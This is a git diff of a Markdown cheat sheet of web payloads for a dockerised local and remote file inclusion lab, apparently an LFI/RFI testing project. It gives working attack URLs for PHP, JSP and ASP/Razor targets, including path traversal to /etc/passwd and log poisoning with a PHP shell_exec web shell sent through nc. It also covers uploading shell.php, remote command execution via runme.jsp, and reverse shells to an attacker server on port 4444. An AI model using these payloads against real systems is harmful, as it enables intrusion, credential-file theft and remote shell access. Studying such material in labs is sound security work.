@@ -1,36 +1,59 @@
 # Payloads
 
+For an in-detail-description of the following payloads go to [https://secf00tprint.github.io/blog/payload-tester/lfirfi/en](https://secf00tprint.github.io/blog/payload-tester/lfirfi/en)
+
 ## PHP
 
-- http://127.0.0.1:8883/lfi.php?language=http://172.18.0.3/check.php?
+### RFI 
+[http://127.0.0.1:8883/lfi.php?language=http://172.18.0.3/check.php?](http://127.0.0.1:8883/lfi.php?language=http://172.18.0.3/check.php?)
 
 see `allow_url_include` in response
 
-- http://127.0.0.1:8883/lfi.php?page=/etc/passwd
+### etc/passwd
 
-- By Experiment add ../ since before etc/passwd until:
+[http://127.0.0.1:8883/lfi.php?page=/etc/passwd](http://127.0.0.1:8883/lfi.php?page=/etc/passwd)
 
-http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd
+By way of experiment add `../` before `etc/passwd` until ...
 
-- Get "access.log", changed here to "access_combined.log" because stdout is going out of docker:
+[http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd](http://127.0.0.1:8883/lfi.php?page=../../../etc/passwd)
 
-http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log
+### Log Injection
+
+Get `access.log`: 
+
+Changed here to `access_combined.log`. The used docker image pipes `access.log` to stdout, so the default log of the apache is know changed. (If somebody knows a way to change `access.log`->`stdout` for this image to write both to stdout and in the file help would be appreciated, please mail me):
+
+[http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log](http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log)
+
+Then use:
 
 ```
 nc -nv 127.0.0.1 8883
 <?php echo shell_exec($_GET['cmd']);?>
 ```
 
-http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&cmd=id
+and
 
--- Check for uid in output
+[http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&cmd=id](http://127.0.0.1:8883/lfi.php?page=../../../var/log/apache2/access_combined.log&cmd=id)
 
-- Upload check.php from attacker-server src folder
-load
-http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check
+Check for uid in output
 
-- upload shell.php
-http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell
+### LFI
+
+#### Verification
+
+Upload check.php from attacker-server src folder
+
+then:
+
+[http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check)
+
+#### Exploit
+
+Upload shell.php
+[http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell)
+
+then:
 
 ```
 docker exec -ti <containerid_attackerserver> /bin/bash
@@ -39,10 +62,35 @@ nc 172.18.0.1 4444
 
 ## JSP
 
-- http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls
-- http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd
-- http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/introduction
+### LFI
 
-# Further Information
+Upload runme.jsp for Remote Code Execution:
 
-https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion
+[http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls)
+[http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd)
+[http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/introduction](http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/introduction)
+
+## ASP / Razor
+
+Use [https://github.com/StefanScherer/windows-docker-machine](https://github.com/StefanScherer/windows-docker-machine) to get a windows docker environment
+
+Upload the files and call:
+
+`SimpleEchopayload.cshtml`
+
+[http://192.168.99.90:8080/?test=SimpleEchoPayload.cshtml](http://192.168.99.90:8080/?test=SimpleEchoPayload.cshtml)
+
+`WinLfiPayload.cshtml`
+
+[http://192.168.99.90:8080/?test=WinLfiPayload.cshtml](http://192.168.99.90:8080/?test=WinLfiPayload.cshtml)
+
+`CheckPowerShell.cshtml`
+
+[http://192.168.99.90:8080/?test=CheckPowerShell.cshtml](http://192.168.99.90:8080/?test=CheckPowerShell.cshtml)
+
+`RevShell.cshtml`, change IP to attacker server ip in the file
+
+nc -nlvp 4444 at attacker server, then:
+
+[http://192.168.99.90:8080/?test=RevShell.cshtml](http://192.168.99.90:8080/?test=RevShell.cshtml)
+
